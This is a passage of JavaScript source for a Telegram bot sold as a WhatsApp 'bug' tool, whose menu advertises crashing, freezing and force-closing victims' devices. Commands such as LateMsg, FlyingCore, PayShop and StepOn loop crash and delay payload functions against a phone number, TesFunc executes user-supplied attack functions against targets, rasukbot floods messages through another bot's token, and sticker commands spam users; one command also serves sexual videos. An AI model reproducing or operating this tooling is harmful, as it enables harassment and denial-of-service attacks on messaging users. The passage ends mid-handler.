  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "⬅️ Back ⬅️", callback_data: "tools_menu" }, { text: " ➡️ Next  ➡️", callback_data: "tqto_menu" }]] };

  await editOrSend(ctx, media, keyboard);
});
//TQTO
bot.action("tqto_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
╔═══════╗
║PAGE 8 / 8
╚═══════╝
  ⼥ CRMUOZ TRIGER ⼥
( 👀 ) Holaa ☇ ${Name}. Thanks Buyer Rozzy.私は ─ WhatsApp テムを破壊しようとしているボットです。賢くご利用ください
╭—⊱(SYSTEM STATUS)⊰―    
│⌬ Author : @Xavatrz
│⌬ Name Bot : TRISHULA TRIGER
│⌬ Version : 15 Gen 1
│⌬ Runtime : ${waktuRunPanel}
╰───────────────╯
╭───────────────╮
│⊱ ALLAH SWT ( Tuhan Kita 💕 ) 
│⊱ @RZOKISAP ( Developer ) 
│⊱ @woltxpt (support) 
╰───────────────╯
╭───────────────╮
│⊱ All Suport
│⊱ All Friend 
│⊱ All Buyyer
│⊱ All Pembenci
│⊱ TRISHULA TRIGER
╰───────────────╯
</blockquote>`;

  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "HTML" };
  const keyboard = { inline_keyboard: [[{ text: "⬅️ Back ⬅️", callback_data: "toolsv2_menu" }, { text: "🏠 Home", callback_data: "back" }]] };

  await editOrSend(ctx, media, keyboard);
});
// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>
T R I S H U L A - T R I G E R 
       V 1.0 GEN 1
       
 PAGE 1 / 8      
 
👑 Pemilik : @Xavatrz

📊 S T A T U S • B O T 
• Name Bot : CRMUOZ TRIGER
• Price Script : 10.000 - 100.000
• Runtime : ${waktuRunPanel}

🔥 E F E K • B U G
• Delay Invisible
• Delay Bulldo
• Blank Device  
• Force Click
• Force One Msg
• Force Audio
• Crash Notif
Buy Script? Contact the Owner
This Is Pemilik : @RZOKISAP
</blockquote>`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { text: "Author Demonic", url: "https://t.me/RZOKISAP" },
        { text: "Channel", url: "https://t.me/" }
      ],
      [
        { text: " ➡️ Next  ➡️", callback_data: "info_menu" }
      ],
      [
        { text: "Channel Rzokisap", url: "https://t.me/" }
      ]
    ]
  };

  await editOrSend(ctx, media, keyboard);
});
///////// TOOLS \\\\\\\\\\
bot.command("Pause", async (ctx) => {
  const target = ctx.message.text.split(" ")[1];

  if (!target) {
    return ctx.reply("❌ Format: /pause 62xxxx");
  }

  if (isPaused(target)) {
    return ctx.reply(`⏸️ ${target} sudah dipause.`);
  }

  pause(target);
  ctx.reply(`⏸️ Target ${target} berhasil dipause.`);
});
bot.command("Resume", async (ctx) => {
  const target = ctx.message.text.split(" ")[1];

  if (!target) {
    return ctx.reply("❌ Format: /resume 62xxxx");
  }

  if (!isPaused(target)) {
    return ctx.reply(`ℹ️ Target ${target} tidak sedang dipause.`);
  }

  resume(target);
  ctx.reply(`▶️ Target ${target} dilanjutkan.`);
});
bot.command("ListPause", async (ctx) => {
  if (pauseTarget.size === 0) {
    return ctx.reply("ℹ️ Tidak ada target yang sedang dipause.");
  }

  let text = "⏸️ DAFTAR TARGET PAUSE:\n\n";
  let no = 1;

  for (const target of pauseTarget.keys()) {
    text += `${no}. ${target}\n`;
    no++;
  }

  ctx.reply(text);
});
bot.command("TesFunc", checkWhatsAppConnection, checkPremium, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /TesFunc 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote><pre>─━━─━━⧼ CRMUOZ TIGER ⧽─━━─━━</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><pre>─━━─━━⧼ CRMUOZ TRIGER ⧽─━━─━━</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)
bot.command("cekdomain", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /cekdomain google.com");

  try {
    const res = await axios.get(`https://api.api-ninjas.com/v1/whois?domain=${args}`, {
      headers: { "X-Api-Key": config.apiNinjasKey }
    });

    const msg = `🌐 *Info Domain:*\n\n` +
                `• Domain: ${args}\n` +
                `• Registrar: ${res.data.registrar}\n` +
                `• Dibuat: ${res.data.creation_date}\n` +
                `• Expired: ${res.data.expiration_date}\n` +
                `• DNS: ${res.data.name_servers.join(", ")}`;

    ctx.reply(msg, { parse_mode: "HTML" });
  } catch (e) {
    ctx.reply("❌ Gagal cek domain (pastikan APIKEY api- sudah benar)");
  }
});
bot.command("ceknum", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /ceknum +6281234567890");

  try {
    const res = await axios.get(`https://api.apilayer.com/number_verification/validate?number=${args}`, {
      headers: { apikey: config.apilayerKey }
    });

    if (!res.data.valid) return ctx.reply("❌ Nomor tidak valid!");

    const msg = `📱 *Info Nomor:*\n\n` +
                `• Nomor: ${res.data.international_format}\n` +
                `• Negara: ${res.data.country_name} (${res.data.country_code})\n` +
                `• Operator: ${res.data.carrier}\n` +
                `• Tipe: ${res.data.line_type}`;

    ctx.reply(msg, { parse_mode: "HTML" });
  } catch (e) {
    ctx.reply("❌ Gagal cek nomor (pastikan APIKEY Api sudah benar)");
  }
});
bot.command("ceknegara", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /ceknegara id");

  try {
    const res = await axios.get(`https://restcountries.com/v3.1/alpha/${args}`);
    const c = res.data[0];

    let msg = `🏴 *Info Negara:*\n\n` +
              `• Nama: ${c.name.common}\n` +
              `• Ibu Kota: ${c.capital ? c.capital[0] : "-"}\n` +
              `• Populasi: ${c.population.toLocaleString()}\n` +
              `• Mata Uang: ${Object.values(c.currencies)[0].name} (${Object.keys(c.currencies)[0]})\n` +
              `• Bahasa: ${Object.values(c.languages).join(", ")}\n` +
              `• Timezone: ${c.timezones.join(", ")}`;

    ctx.reply(msg, { parse_mode: "HTML" });
  } catch (e) {
    ctx.reply("❌ Kode negara tidak valid!");
  }
});
bot.command("cekidteman", checkPremium, async (ctx) => {
  let user;

  if (ctx.message.reply_to_message) {
    user = ctx.message.reply_to_message.from;
  } else {
    user = ctx.from;
  }

  const text = `
🆔 *CEK ID TELEGRAM*
━━━━━━━━━━━━━━
👤 Nama : ${user.first_name || "-"}
🔖 Username : ${user.username ? "@" + user.username : "-"}
🧾 User ID : ${user.id}
🤖 Is Bot : ${user.is_bot ? "Ya" : "Tidak"}
  `;

  ctx.reply(text, { parse_mode: "HTML" });
});
bot.command("cekid", async (ctx) => {
  const user = ctx.from;

  const text = `
🆔 *CEK ID TELEGRAM*
━━━━━━━━━━━━━━
👤 Nama : ${user.first_name || "-"}
🔖 Username : ${user.username ? "@" + user.username : "-"}
🧾 User ID : ${user.id}
🤖 Is Bot : ${user.is_bot ? "Ya" : "Tidak"}
  `;

  ctx.reply(text, { parse_mode: "HTML" });
});
bot.command("rasukbot", checkPremium, async (ctx) => {
  try {
    // Ambil teks setelah command
    const input = ctx.message.text.split(" ").slice(1).join(" ")

    if (!input || !input.includes("|")) {
      return ctx.reply(
        "📩 <b>Format salah!</b>\n\n" +
        "Gunakan format:\n" +
        "<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
        "Contoh:\n" +
        "<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>",
        { parse_mode: "HTML" }
      )
    }

    const [token, targetId, pesan, jumlahStr] =
      input.split("|").map(v => v.trim())

    const jumlah = parseInt(jumlahStr)

    if (!token || !targetId || !pesan || isNaN(jumlah) || jumlah < 1) {
      return ctx.reply(
        "❌ <b>Format tidak valid!</b>\nGunakan:\n<code>/rasukbot token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      )
    }

    await ctx.reply("🚀 Mengirim pesan...")

    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      })
    }

    await ctx.reply(
      `✅ <b>Berhasil!</b>\nMengirim <b>${jumlah}</b> pesan ke ID <code>${targetId}</code>`,
      { parse_mode: "HTML" }
    )

  } catch (err) {
    console.error("❌ rasukbot error:", err)
    ctx.reply(
      `❌ <b>Gagal mengirim pesan</b>\n<code>${err.message}</code>`,
      { parse_mode: "HTML" }
    )
  }
})
bot.command("filmdewasa", checkPremium, async (ctx) => {
  try {
    await ctx.reply("⏱️ Tunggu sebentar ya sayang... 😘")

    const raw = fs.readFileSync("./Privasi/Privat.json", "utf8")
    const json = JSON.parse(raw)

    if (!Array.isArray(json.videos) || json.videos.length === 0) {
      return ctx.reply("🚫 Video tidak tersedia.")
    }

    const captions = [
      "Asupan hari ini sayangg🥵💦",
      "mana tahan🥵",
      "pulen bgtt🥵💦",
      "enak banget🥰",
      "andai aku disitu😋",
      "tete padet😳",
      "jadi sagne💦",
    ]

    const hasil = json.videos[Math.floor(Math.random() * json.videos.length)]
    const caption = captions[Math.floor(Math.random() * captions.length)]

    await ctx.replyWithVideo({ url: hasil }, { caption })

  } catch (err) {
    console.error("❌ Error filmdewasa:", err)
    ctx.reply("⚠️ Terjadi kesalahan saat mengambil video.")
  }
})
bot.command("chatdev", checkPremium, async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ")

  if (!text) {
    return ctx.reply("❗ Contoh: /chatdev halo dev")
  }

  try {
    await sendNotifOwner(ctx, `Pesan dari pengguna:\n${text}`)
    ctx.reply("✅ Pesan kamu sudah dikirim ke Xava, tunggu ya.")
  } catch (err) {
    console.error(err)
    ctx.reply("❌ Gagal mengirim pesan.")
  }
})

// ===== /maps =====
bot.command("maps", checkPremium, async (ctx) => {
  const lokasi = ctx.message.text.replace("/maps", "").trim();
  if (!lokasi) return ctx.reply("Contoh: /maps Jakarta");

  const link = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lokasi)}`;
  ctx.reply(`🗺 Lokasi ditemukan:\n${link}`);
});

// ===== /gempa =====
bot.command("gempa", checkPremium, async (ctx) => {
  try {
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
    const data = await res.json();
    const gempa = data.Infogempa.gempa;

    const info = `
📢 *Info Gempa Terbaru BMKG*
📅 Tanggal: ${gempa.Tanggal}
🕒 Waktu: ${gempa.Jam}
📍 Lokasi: ${gempa.Wilayah}
📊 Magnitudo: ${gempa.Magnitude}
📌 Kedalaman: ${gempa.Kedalaman}
🌊 Potensi: ${gempa.Potensi}
🧭 Koordinat: ${gempa.Coordinates}
🗺️ *Dirasakan:* ${gempa.Dirasakan || "-"}
Sumber: ©Xava
    `;

    ctx.reply(info, { parse_mode: "HTML" });
  } catch (err) {
    ctx.reply("⚠️ Gagal mengambil data gempa dari BMKG.");
  }
});
// ===== KICK =====
owner.command("kick", async (ctx) => {
  if (!(await onlyGroup(ctx))) return;
  if (!mustReplyUser(ctx)) return;

  const user = ctx.message.reply_to_message.from;

  await ctx.telegram.banChatMember(ctx.chat.id, user.id);
  await ctx.telegram.unbanChatMember(ctx.chat.id, user.id);

  ctx.reply("👢 Kick berhasil");
});

// ===== MUTE =====
owner.command("mute", async (ctx) => {
  if (!(await onlyGroup(ctx))) return;
  if (!mustReplyUser(ctx)) return;

  const user = ctx.message.reply_to_message.from;
  const arg = ctx.message.text.split(" ")[1];
  const duration = parseDuration(arg);

  await ctx.telegram.restrictChatMember(ctx.chat.id, user.id, {
    permissions: {
      can_send_messages: false,
      can_send_media_messages: false,
      can_send_polls: false,
      can_send_other_messages: false,
      can_add_web_page_previews: false,
      can_invite_users: false
    },
    until_date: Math.floor(Date.now() / 1000) + duration
  });

  ctx.reply("🔇 User dimute");
});
// ===== UNMUTE =====
owner.command("unmute", async (ctx) => {
  if (!(await onlyGroup(ctx))) return;
  if (!mustReplyUser(ctx)) return;

  const user = ctx.message.reply_to_message.from;

  await ctx.telegram.restrictChatMember(ctx.chat.id, user.id, {
    permissions: {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_polls: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true,
      can_invite_users: true
    },
    until_date: 0
  });

  ctx.reply("🔓 User diunmute");
});

// ===== PROMOTE =====
owner.command("promote", async (ctx) => {
  if (!(await onlyGroup(ctx))) return;
  if (!mustReplyUser(ctx)) return;

  const user = ctx.message.reply_to_message.from;

  await ctx.telegram.promoteChatMember(ctx.chat.id, user.id, {
    can_manage_chat: true,
    can_delete_messages: true,
    can_restrict_members: true,
    can_invite_users: true,
    can_pin_messages: true
  });

  ctx.reply("👑 User jadi admin");
});

// ===== INFO =====
owner.command("info", async (ctx) => {
  const target = ctx.message.reply_to_message
    ? ctx.message.reply_to_message.from
    : ctx.from;

  ctx.reply(
    `🆔 USER INFO
👤 Nama: ${target.first_name || "-"}
🧬 ID: ${target.id}`,
  );
});
// ===== STICKER FUNCTIONS =====
async function VortunixStc(target) {
  try {
    await bot.telegram.sendSticker(
      target,
      'CAACAgUAAxkBAAIWg2iZonsTqQx20w5KxwIjOmcmE1uwAALcHgACFCbQVOr1YtwWikmkNgQ'
    );
    await sleep(1000);
  } catch (err) {
    console.log("ERROR SEND STICKER:", err.message);
  }
}

async function VortunixStc2(target) {
  try {
    await bot.telegram.sendSticker(
      target,
      'CAACAgUAAxkDAAIWgGiZoiu2gfFbl2DxzUDs-oZpdY0PAAKJFAAC41bRVD6RMmSpOYPSNgQ'
    );
    await sleep(1000);
  } catch (err) {
    console.log("ERROR SEND STICKER:", err.message);
  }
}

async function VortunixStc3(target) {
  try {
    await bot.telegram.sendSticker(
      target,
      'CAACAgUAAxkBAAIVYWiYRATZsIwj4Ce1_qA8YDUvE092AALuCAACIVy5VnzL8L2qVBqZNgQ'
    );
    await sleep(1000);
  } catch (err) {
    console.log("ERROR SEND STICKER:", err.message);
  }
}


// Case And Panggilan
bot.command("StcOne", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const target = args[1];

  if (!target || isNaN(target)) {
    return ctx.reply("Example:\n/StcOne 7571435782");
  }

  for (let i = 0; i < 10; i++) {
    await VortunixStc(target);
  }

  await ctx.reply("✅ Process selesai");
});
bot.command("StcTwo", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const target = args[1];

  if (!target || isNaN(target)) {
    return ctx.reply("Example:\n/StcTwo 7571435782");
  }

  for (let i = 0; i < 10; i++) {
    await VortunixStc2(target);
  }

  await ctx.reply("✅ Process selesai");
});
bot.command("StcThree", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const target = args[1];

  if (!target || isNaN(target)) {
    return ctx.reply("Example:\n/StcThree 7571435782");
  }

  for (let i = 0; i < 10; i++) {
    await VortunixStc3(target);
  }

  await ctx.reply("✅ StcThree selesai");
});
//////// -- CASE BUG 1 --- \\\\\\\\\\\
// Fitur: xvisible
bot.command("LateMsg", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /LateMsg 62×××`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTarget(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 30%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© TRISHULA TRIGER V1`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 30%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© TRISHULA TRIGER V1`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    await waitIfPaused(target);
    
      await Promise.allSettled([
        badzznedelay(target),
        badzznedelay(target),
        FlowV2(target),
        FlowV2(target),
      ]);
      await sleep(700);
    }

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 30%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© TRISHULA TRIGER V1`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("LateMsg Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("LateMsgQuote", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /LateMsgQuote 62×××`);

    if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.sendPhoto(
    getRandomImage(),
      {
        caption: `▢ Target: ${q}
▢ Status: Processing
▢ Sending : ${progressStages[0]}

© TRISHULA TRIGER V1
Habis Bug Jeda 10 Menit!!!
`,
        parse_mode: "HTML",
      }
    );

    if (!ownerUsers.includes(ctx.from.id)) setGlobalCooldown();

    // ===== PROGRESS BAR =====
    for (let i = 1; i < progressStages.length; i++) {
      await new Promise((r) => setTimeout(r, 2000));
      await ctx.telegram.editMessageCaption(
        chatId,
        sentMessage.message_id,
        undefined,
        `▢ Target: ${q}
▢ Resiko Ban : 30% Doang
▢ Status: Processing
▢ Progress : ${progressStages[i]}

© TRISHULA TRIGER V1
Habis Bug Jeda 10 Menit!!!
`,
        { parse_mode: "HTML" }
      );
    }

    // ===== MAIN ATTACK LOOP =====
    for (let i = 0; i < 10; i++) {
    await waitIfPaused(target);
    
      await Promise.all([
        badzznedelay(target),
        badzznedelay(target),
      ]);

      // ===== DELAY DINAMIS =====
      const batchIndex = Math.floor(i / 15);
      const baseDelay = 3500;
      const increasePerBatch = 500;
      const maxDelay = 25500;

      let currentDelay = baseDelay + (batchIndex * increasePerBatch);
      if (currentDelay > maxDelay) currentDelay = maxDelay;

      await new Promise((resolve) => setTimeout(resolve, currentDelay));

      if ((i + 1) % 60 === 0) {
        console.log(
          `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai — delay ${(currentDelay / 1000).toFixed(1)}s`
        );
        await new Promise((resolve) => setTimeout(resolve, 2 * 60 * 1000));
      }
    }

    // ===== SUCCESS =====
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
      media: getRandomImage(), // 🔥 FIX
        caption: `▢ Target: ${q}
▢ Resiko Ban : 30% Doang
▢ Status: Successfully...
▢ Progress: [██████████] 100%

© TRISHULA TRIGER V1
Habis Bug Jeda 10 Menit!!!
`,
        parse_mode: "HTML",
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${q}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("XDelay Error:", err);
    ctx.reply("❌ Terjadi error saat proses.");
  }
});
bot.command("FlyingCore", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /FlyingCore 62xxxx`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTarget(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© TRISHULA TRIGER V1`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© TRISHULA TRIGER V1`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    await waitIfPaused(target);
    
      await Promise.allSettled([
        PayOneMsg(sock, target),
        FcXMsg(sock, target),
      ]);
      await sleep(700);
    }

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Successfully
▢ Progress: [██████████] 100%

© TRISHULA TRIGER V1`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("FlyingCore Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
/////////----- CASE BUG 3 -----\\\\\\\\\\\
bot.command("PayShop", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /PayShop 62xxxx`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTarget(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© TRISHULA TRIGER V1`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© TRISHULA TRIGER V1`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    await waitIfPaused(target);
    
      await Promise.allSettled([
        PayOneMsg(sock, target),
        PayOneMsg(sock, target),
        PayOneMsg(sock, target),
        PayOneMsg(sock, target),
      ]);
      await sleep(700);
    }

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
        caption: `▢ Target: ${num}
▢ Status: Successfully
▢ Progress: [██████████] 100%

© TRISHULA TRIGER V1`,
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET ‼️", url: `https://wa.me/${num}` }],
          ],
        },
      }
    );

  } catch (err) {
    console.error("FlyingCore Error:", err);
    ctx.reply("❌ Terjadi kesalahan saat eksekusi");
  }
});
bot.command("StepOn", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message?.text || "";
    const q = text.split(" ")[1];
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!q) return ctx.reply(`Example: /StepOn 62xxxx`);

    // Global cooldown
    if (!OWNER_IDS.includes(userId) && isOnGlobalCooldown()) {
      return ctx.reply(`⏳ Sabar Bang\nTunggu ${getGlobalRemaining()} detik lagi`);
    }
    if (!OWNER_IDS.includes(userId)) setGlobalCooldown();

    // Resolve target (AMAN)
    const safe = await resolveTarget(ctx, q);
    if (!safe) return;
    const { sock, num, target } = safe;

    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `▢ Target: ${num}
▢ Resiko Ban : 60%
▢ Status: Processing
▢ Progress: ${progressStages[0]}

© Demonic Crasher V15`,
    });

    // Progress update
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(1500);
      try {
        await ctx.telegram.editMessageCaption(
          chatId,
          sentMessage.message_id,
          undefined,
          `▢ Target: ${num}
▢ Resiko Ban : 70%
▢ Status: Processing
▢ Progress: ${progressStages[i]}

© TRISHULA TRIGER V1`
        );
      } catch {}
    }

    // EXEC
    for (let i = 0; i < 5; i++) {
    await waitIfPaused(target);
    
      await Promise.allSettled([
        function4(sock, target),
        function1(sock, target),
        function7(sock, target),
      ]);
      await sleep(700);
    }

    // Final update
    await ctx.telegram.editMessageMedia(
      chatId,
      sentMessage.message_id,
      undefined,
      {
        type: "photo",
        media: getRandomImage(),
